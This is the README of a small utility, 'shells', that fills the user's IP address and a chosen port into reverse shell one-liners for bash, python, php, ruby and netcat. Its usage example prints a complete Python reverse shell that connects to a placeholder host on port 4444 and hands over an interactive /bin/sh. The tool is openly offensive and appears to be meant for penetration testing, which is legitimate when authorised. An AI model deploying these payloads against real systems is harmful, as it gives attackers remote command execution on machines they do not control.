# shells
Grabs your IPv4 from the specified device and inserts the IP and specified port into various reverse shell oneliners

# Installation
Copy `shells` file to a directory in your `$PATH` 

# Usage
```console
$ shells
shells - Grabs device IP and outputs a reverse shell.
Usage: shells {bash|python|php|ruby|nc|all} [PORT]
$ shells python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("example_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
